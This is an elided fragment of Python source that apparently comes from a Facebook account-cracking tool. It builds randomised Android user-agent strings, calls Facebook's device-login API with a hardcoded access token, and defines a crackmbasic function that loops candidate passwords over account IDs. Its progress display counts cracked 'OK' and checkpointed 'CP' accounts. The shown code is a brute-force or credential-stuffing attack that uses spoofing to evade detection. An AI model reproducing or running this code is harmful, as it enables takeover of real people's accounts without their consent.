...
for t in range(10000):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; 23028RN4DG Build/TP1A.{b}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android {a}; SM-A115F Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen3=f'Mozilla/5.0 (Linux; Android {a}; PFVM10 Build/RP1A.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen4=f'Mozilla/5.0 (Linux; Android {a}; V2133A Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	...
	try:
		...
		with requests.Session() as r:
			try:
				...
				data = {'access_token': '100043485017160_1604512333360519','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v17.0/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v16.0/device/login_status?method=post&code={}&access_token=100043485017160_1604512333360519&callback=LeetsharesCallback'.format(code))
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}RINTO-GACOR{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
